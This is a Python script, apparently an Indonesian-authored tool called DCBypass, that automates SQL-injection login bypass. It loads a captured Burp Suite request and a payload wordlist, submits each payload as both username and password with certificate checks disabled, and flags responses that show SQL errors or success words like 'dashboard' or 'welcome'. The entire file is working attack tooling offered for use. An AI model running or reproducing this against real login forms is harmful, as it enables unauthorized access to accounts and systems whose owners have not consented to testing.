# Version 1.01
import argparse
import requests
from urllib.parse import urlparse, parse_qs
import re
from rich.console import Console
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Warna terminal
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"
putih = '\033[97m'
hijau = '\033[92m'
merah = '\033[91m'
kuning = '\033[93m'
akhir = '\033[0m'
latar = '\033[7;91m'
info = '\033[33m[!]\033[0m'
tanya = '\033[34m[?]\033[0m'
salah = '\033[31m[-]\033[0m'
benar = '\033[32m[+]\033[0m'
jalan = '\033[97m[~]\033[0m'

console = Console()

if sys.version_info[0] == 2:
    input = raw_input
    from urlparse import urlparse
else:
    from urllib.parse import urlparse

    ascii_art = merah + r"""
 ________  ________  ________      ___    ___ ________  ________  ________   ________      
|\   ___ \|\   ____\|\   __  \    |\  \  /  /|\   __  \|\   __  \|\   ____\ |\   ____\     
\ \  \_|\ \ \  \___|\ \  \|\ /_   \ \  \/  / | \  \|\  \ \  \|\  \ \  \___|_\ \  \___|_    
 \ \  \ \\ \ \  \    \ \   __  \   \ \    / / \ \   ____\ \   __  \ \_____  \\ \_____  \   
  \ \  \_\\ \ \  \____\ \  \|\  \   \/  /  /   \ \  \___|\ \  \ \  \|____|\  \\|____|\  \  
   \ \_______\ \_______\ \_______\__/  / /      \ \__\    \ \__\ \__\____\_\  \ ____\_\  \ 
    \|_______|\|_______|\|_______|\___/ /        \|__|     \|__|\|__|\_________\\_________\
                                 \|___|/                            \|_________\|_________|
""" + akhir

    info = hijau + """
    ============================================
    |         DCBypass v.1 by NantzzSec        |
    |           Description: DCBypass          |
    ============================================
""" + akhir

    print(ascii_art)
    print(info)

def parse_request_file(filepath):
    with open(filepath, "r") as file:
        lines = file.read().splitlines()

    request_line = lines[0]
    method, path, _ = request_line.split()

    headers = {}
    body = ""
    is_body = False
    for line in lines[1:]:
        if line == "":
            is_body = True
            continue
        if is_body:
            body += line
        else:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()

    scheme = "http"
    if "https" in headers.get("Origin", ""):
        scheme = "https"
    url = f"{scheme}://{headers['Host']}{path}"

    return method, url, headers, body

def extract_parameters(body):
    print(f"[DEBUG] Body yang diterima untuk parsing:\n{body}\n")
    parsed = parse_qs(body)
    print(f"[DEBUG] Parameter yang ditemukan:\n{parsed}\n")
    return parsed

def test_payload(payload, url, headers, uname_field, pass_field, success_payloads):
    data = {
        uname_field: payload,
        pass_field: payload
    }

    try:
        s = requests.Session()
        response = s.post(url, data=data, headers=headers, allow_redirects=False, verify=False)

        content = response.text.lower()
        found_keywords = any(keyword in content for keyword in ["login success", "logout", "welcome", "dashboard", "berhasil login"])

        if response.status_code == 200:
            if "sql syntax" in content or "mysql_fetch" in content or "you have an error in your sql" in content:
                print(f"{kuning}[!] payload  > '{payload}'  Status: 200 Ok! (Sql Syntax Error){RESET}")
                success_payloads.append(payload)
            elif found_keywords:
                print(f"{hijau}[+] payload  > '{payload}'  Status: 200 Ok! (Keyword Match: Success Login){RESET}")
                success_payloads.append(payload)
            else:
                print(f"{putih}[*] payload  > '{payload}'  Status: 200 Ok!{RESET}")
        elif response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get("Location", "Unknown")
            print(f"{BLUE}[~] payload  > '{payload}'  Redirected! (Status: {response.status_code}, Location: {location}){RESET}")
        else:
            print(f"{merah}[-] payload  > '{payload}' (Status: {response.status_code}){RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--request", required=True, help="File HTTP request (format Burp Suite)")
    parser.add_argument("-w", "--wordlist", required=True, help="File wordlist payload")
    parser.add_argument("-U", "--uname", required=True, help="Nama parameter username")
    parser.add_argument("-P", "--password", required=True, help="Nama parameter password")
    args = parser.parse_args()

    method, url, headers, body = parse_request_file(args.request)

    print(f"[DEBUG] Parsed URL: {url}")
    print(f"[DEBUG] Method: {method}")
    print(f"[DEBUG] Headers: {headers}")

    params = extract_parameters(body)

    if args.uname not in params:
        print(f"{RED}[-] Parameter '{args.uname}' not found!{RESET}")
    else:
        print(f"{GREEN}[+] Parameter '{args.uname}' ditemukan!{RESET}")

    if args.password not in params:
        print(f"{RED}[-] Parameter '{args.password}' not found!{RESET}")
    else:
        print(f"{GREEN}[+] Parameter '{args.password}' ditemukan!{RESET}")

    with open(args.wordlist, "r") as f:
        payloads = [line.strip() for line in f if line.strip()]

    print(f"{BLUE}[~] Memulai testing {len(payloads)} payload...\n{RESET}")

    success_payloads = []

    for payload in payloads:
        test_payload(payload, url, headers, args.uname, args.password, success_payloads)

    if success_payloads:
        print(f"\nTotal {len(success_payloads)} Payload success:")
        for success in success_payloads:
            print(f"{GREEN}[+] ✅ payload  > '{success}'{RESET}")
        print("\nTask Complete!")
    else:
        print(f"\nNo payloads were successful.")

if __name__ == "__main__":
    main()
